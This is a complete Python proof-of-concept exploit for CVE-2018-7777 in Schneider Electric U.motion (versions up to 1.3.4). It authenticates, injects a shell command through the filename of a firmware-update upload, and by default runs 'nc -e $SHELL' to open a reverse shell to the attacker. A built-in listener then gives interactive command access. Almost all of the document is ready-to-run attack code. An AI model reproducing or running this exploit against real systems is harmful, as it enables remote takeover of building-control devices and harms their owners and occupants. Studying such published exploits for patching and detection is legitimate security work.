# Date: 2018-08-01
# Exploit Author: Cosmin Craciun
# Vendor Homepage: https://www.se.com
# Version: <= 1.3.4
# Tested on: Delivered Virtual Appliance running on Windows 10 x64
# CVE : CVE-2018-7777
# References: https://github.com/cosmin91ro

#!/usr/bin/python


from __future__ import print_function
import httplib
import urllib
import argparse
import re
import sys
import socket
import threading
import time

parser = argparse.ArgumentParser(description=&#039;PoC&#039;)
parser.add_argument(&#039;--target&#039;,  help=&#039;IP or hostname of target&#039;, required=True)
parser.add_argument(&#039;--port&#039;,  help=&#039;TCP port the target app is running&#039;, required=True, default=&#039;8080&#039;)
parser.add_argument(&#039;--username&#039;,  help=&#039;TCP port the target app is running&#039;, required=True, default=&#039;admin&#039;)
parser.add_argument(&#039;--password&#039;,  help=&#039;TCP port the target app is running&#039;, required=True, default=&#039;admin&#039;)
parser.add_argument(&#039;--command&#039;, help=&#039;malicious command to run&#039;, default=&#039;shell&#039;)
parser.add_argument(&#039;--src_ip&#039;, help=&#039;IP of listener for the reverse shell&#039;, required=True)
parser.add_argument(&#039;--timeout&#039;, help=&#039;time in seconds to wait for a response&#039;, type=int, default=3)

class Exploiter(threading.Thread):
    def __init__ (self, target, port, timeout, uri, body, headers, shell_mode):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port
        self.timeout = timeout
        self.uri = uri
        self.body = body
        self.headers = headers
        self.shell_mode = shell_mode

    def send_exploit(self, target, port, timeout, uri, body, headers):
        print(&#039;Sending exploit ...&#039;)
        conn = httplib.HTTPConnection("{0}:{1}".format(target, port), timeout=timeout)
        conn.request("POST", uri, body, headers)
        print("Exploit sent")
        if not self.shell_mode: print("Getting response ...")

        try:
            response = conn.getresponse()
            if not self.shell_mode: print(str(response.status) + " " + response.reason)
            data = response.read()
            if not self.shell_mode: print(&#039;Response: {0}\r\nCheck the exploit result&#039;.format(data))

        except socket.timeout:
            if not self.shell_mode: print("Connection timeout while waiting response from the target.\r\nCheck the exploit result")

    def run(self):
        self.send_exploit(self.target, self.port, self.timeout, self.uri, self.body, self.headers)

class Listener(threading.Thread):
    def __init__(self, src_ip):
        threading.Thread.__init__(self)
        self.src_ip = src_ip

    def run(self):
        self.listen(self.src_ip)

    def listen(self, src_ip):
        TCP_IP = src_ip
        TCP_PORT = 4444
        BUFFER_SIZE = 1024

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((TCP_IP, TCP_PORT))
            print("Listener open on port {0}".format(TCP_PORT))
            s.listen(1)

            conn, addr = s.accept()
            print(&#039;Exploited: &#039; + str(addr))

            while 1:
                comm = raw_input("shell$ ").strip()
                if comm == "quit":
                    conn.close()
                    sys.exit(0)

                if comm != "":
                    conn.send(comm + " 2>&1" + "\x0a")
                    while 1:
                        data = conn.recv(BUFFER_SIZE)
                        if not data: break
                        print(data, end="")
                        if "\x0a" in data: break

        except Exception as ex:
            print("Could not start listener")
            print(ex)

def login(target, port, username, password):
    uri = "http://{0}:{1}/umotion/modules/system/user_login.php".format(target, port)

    params = urllib.urlencode({
        &#039;username&#039;: username,
        &#039;password&#039;: password,
        &#039;rememberMe&#039;: &#039;1&#039;,
        &#039;context&#039;: &#039;configuration&#039;,
        &#039;op&#039;: &#039;login&#039;
    })

    headers = {
        "Content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept": "*/*"
    }

    try:
        conn = httplib.HTTPConnection("{0}:{1}".format(target, port))
        conn.request("POST", uri, params, headers)
        response = conn.getresponse()
        print(str(response.status) + " " + response.reason)
        data = response.read()
    except socket.timeout:
        print("Connection timeout while logging in. Check if the server is available")
        return


    cookie = response.getheader("Set-Cookie")
    #print(cookie)

    r = re.match(r&#039;PHPSESSID=(.{26});.*loginSeed=(.{32})&#039;, cookie)
    if r is None:
        print("Regex not match, could not get cookies")
        return

    if len(r.groups()) < 2:
        print("Error while getting cookies")
        return

    sessid = r.groups()[0]
    login_seed = r.groups()[1]

    return sessid, login_seed

    conn.close()


def encode_multipart_formdata(fields, files):
    LIMIT = &#039;----------lImIt_of_THE_fIle_eW_$&#039;
    CRLF = &#039;\r\n&#039;
    L = []
    for (key, value) in fields:
        L.append(&#039;--&#039; + LIMIT)
        L.append(&#039;Content-Disposition: form-data; name="%s"&#039; % key)
        L.append(&#039;&#039;)
        L.append(value)
    for (key, filename, value) in files:
        L.append(&#039;--&#039; + LIMIT)
        L.append(&#039;Content-Disposition: form-data; name="%s"; filename="%s"&#039; % (key, filename))
        L.append(&#039;Content-Type: application/x-gzip&#039;)
        L.append(&#039;&#039;)
        L.append(value)
    L.append(&#039;--&#039; + LIMIT + &#039;--&#039;)
    L.append(&#039;&#039;)
    body = CRLF.join(L)
    content_type = &#039;multipart/form-data; boundary=%s&#039; % LIMIT
    return content_type, body


def exploit(target, port, username, password, command, timeout):
    uri = "http://{0}:{1}/umotion/modules/system/update_module.php".format(target, port)

    fields = [
        (&#039;choose_update_mode&#039;, &#039;MANUAL&#039;),
        (&#039;add_button&#039;, &#039;0&#039;),
        (&#039;format&#039;, &#039;json&#039;),
        (&#039;step&#039;, &#039;2&#039;),
        (&#039;next&#039;, &#039;1&#039;),
        (&#039;name_update_file&#039;, &#039;&#039;),
        (&#039;path_update_file&#039;, &#039;&#039;),
        (&#039;type_update_file&#039;, &#039;&#039;)
    ]

    listener = None
    if command == "shell":
        shell_mode = True
        command = "nc -e $SHELL {0} 4444".format(args.src_ip)
        listener = Listener(args.src_ip)
        listener.start()
        time.sleep(3)
    else:
        shell_mode = False

    files = [
        (&#039;update_file&#039;, &#039;my;{0};file.tar.gz&#039;.format(command), "\x1f\x8b")
    ]

    content_type, body = encode_multipart_formdata(fields, files)

    if not shell_mode or (shell_mode and listener and listener.isAlive()):
        print(&#039;Logging in ...&#039;)
        sess_id, login_seed = login(target, port, username, password)
        if sess_id is None or login_seed is None:
            print(&#039;Error while logging in&#039;)
            return

        print(&#039;Logged in ! &#039;)

        headers = {
            &#039;Accept&#039;: &#039;application/json,text/javascript,*/*; q=0.01&#039;,
            &#039;Accept-Encoding&#039;: &#039;gzip,deflate&#039;,
            &#039;Referer&#039;: &#039;http://{0}:{1}/umotion/modules/system/externalframe.php?context=configuration&#039;.format(target, port),
            &#039;X-Requested-With&#039;: &#039;XMLHttpRequest&#039;,
            &#039;Content-Length&#039;: len(body),
            &#039;Content-Type&#039;: content_type,
            &#039;Connection&#039;: &#039;keep-alive&#039;,
            &#039;Cookie&#039;: &#039;PHPSESSID={0}; loginSeed={1}&#039;.format(sess_id, login_seed)
        }

        exploiter = Exploiter(target, port, timeout, uri, body, headers, shell_mode)
        exploiter.start()

if __name__ == &#039;__main__&#039;:
    args = parser.parse_args()
    exploit(args.target, args.port, args.username, args.password, args.command, args.timeout)

